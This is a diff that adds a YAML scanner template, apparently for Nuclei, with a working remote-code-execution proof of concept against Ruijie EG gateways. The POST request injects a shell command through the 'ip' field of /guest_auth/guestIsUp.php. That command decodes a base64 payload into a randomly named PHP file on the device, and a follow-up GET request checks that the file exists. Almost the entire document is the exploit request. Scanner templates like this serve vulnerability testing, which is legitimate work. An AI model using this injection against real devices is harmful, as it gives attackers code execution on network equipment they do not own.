@@ -1,0 +1,37 @@
+id: poc-yaml-ruijie-eg-rce
+
+info:
+  name: poc-yaml-ruijie-eg-rce
+  author: White(https://github.com/WhiteHSBG)
+  severity: critical
+  tags: xray-converted,rce,ct-158830
+  reference:
+    - https://xz.aliyun.com/t/9016?page=1
+
+http:
+  - raw:
+      - |
+        POST /guest_auth/guestIsUp.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        ip=127.0.0.1|echo '{{payload}}' | base64 -d > {{rand_base(8)}}.php&mac=00-00
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /guest_auth/{{rand_base(8)}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
